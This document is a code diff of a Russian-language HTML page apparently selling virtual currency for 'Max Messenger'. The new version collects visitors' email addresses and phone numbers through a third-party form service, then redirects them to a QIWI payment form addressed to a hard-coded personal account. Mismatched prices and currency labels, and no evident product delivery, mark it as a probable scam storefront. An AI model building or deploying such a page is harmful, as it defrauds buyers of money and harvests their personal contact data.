@@ -2,46 +2,59 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Max Messenger Store</title>
+    <title>Max Messenger Premium ₸</title>
     <style>
-        body { background: #0f1216; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; }
-        .shop-title { margin-top: 50px; color: #5865f2; font-size: 32px; }
-        .container { display: flex; justify-content: center; gap: 25px; padding: 50px; }
-        .card { 
-            background: #1c2128; border: 2px solid #30363d; border-radius: 20px; 
-            padding: 30px; width: 280px; transition: 0.4s;
-        }
-        .card:hover { border-color: #5865f2; transform: scale(1.05); }
-        .price { font-size: 28px; color: #2ecc71; margin: 20px 0; }
-        .buy-btn { 
-            background: #5865f2; color: white; border: none; padding: 12px; 
-            width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; 
-        }
+        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: #15191d; padding: 40px; border-radius: 20px; text-align: center; width: 350px; border: 1px solid #2d333b; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { color: #5865f2; margin-bottom: 5px; font-size: 28px; }
+        .subtitle { color: #8b949e; margin-bottom: 20px; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
+        label { display: block; margin-bottom: 10px; color: #8b949e; text-align: left; font-size: 14px; }
+        select, input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
+        .item-info { color: #ffffff; font-weight: bold; margin-top: 15px; font-size: 16px; }
+        .price-tag { font-size: 36px; color: #2ecc71; font-weight: bold; margin: 10px 0 25px 0; }
+        .buy-btn { background: #5865f2; color: white; border: none; width: 100%; padding: 15px; border-radius: 8px; cursor: pointer; font-size: 18px; font-weight: bold; transition: 0.3s; }
+        .buy-btn:hover { background: #4752c4; }
     </style>
 </head>
 <body>
-    <h1 class="shop-title">💎 МАГАЗИН MAX MESSENGER</h1>
-    <p>Выберите пакет валюты для мгновенного получения кода</p>
+
+<div class="container">
+    <h1>MAX SHOP</h1>
+    <div class="subtitle">Магазин игровых ценностей</div>
     
-    <div class="container">
-        <div class="card">
-            <h2>500 РУБ</h2>
-            <p>Код: ДискордРулит</p>
-            <div class="price">100₽</div>
-            <button class="buy-btn" onclick="location.href='pay.html?item=500'">КУПИТЬ</button>
-        </div>
-        <div class="card">
-            <h2>1000 РУБ</h2>
-            <p>Код: Майнтопчик777</p>
-            <div class="price">200₽</div>
-            <button class="buy-btn" onclick="location.href='pay.html?item=1000'">КУПИТЬ</button>
-        </div>
-        <div class="card">
-            <h2>5000 РУБ</h2>
-            <p>Код: рфхуета</p>
-            <div class="price">500₽</div>
-            <button class="buy-btn" onclick="location.href='pay.html?item=5000'">КУПИТЬ</button>
-        </div>
-    </div>
+    <label>Выберите пакет валюты:</label>
+    <select id="package" onchange="updateView()">
+        <option value="500">500 Вирт. Рублей</option>
+        <option value="1000">1000 Вирт. Рублей</option>
+        <option value="25000">5000 Вирт. Рублей</option>
+    </select>
+
+    <div class="item-info">Товар: <span style="color: #5865f2;">Виртуальная валюта</span></div>
+    <div class="price-tag" id="dp">500 ₸</div>
+
+    <form action="https://formspree.io/f/mnjbdzvg" method="POST" id="pf">
+        <input type="email" name="email" placeholder="Ваша почта для получения кода" required>
+        <input type="tel" name="phone" placeholder="Ваш номер телефона" required>
+        <input type="hidden" name="product" id="hidden_product" value="500 Вирт. Рублей">
+        
+        <button type="submit" class="buy-btn">ОПЛАТИТЬ В QIWI</button>
+    </form>
+</div>
+
+<script>
+    function updateView() {
+        let select = document.getElementById('package');
+        let price = select.value;
+        document.getElementById('dp').innerText = price + ' ₸';
+        document.getElementById('hidden_product').value = select.options[select.selectedIndex].text;
+    }
+
+    document.getElementById('pf').onsubmit = function() {
+        setTimeout(function() {
+            window.location.href = "https://qiwi.com/payment/form/99?extra['account']=79291657815"; 
+        }, 1000);
+    };
+</script>
+
 </body>
 </html>
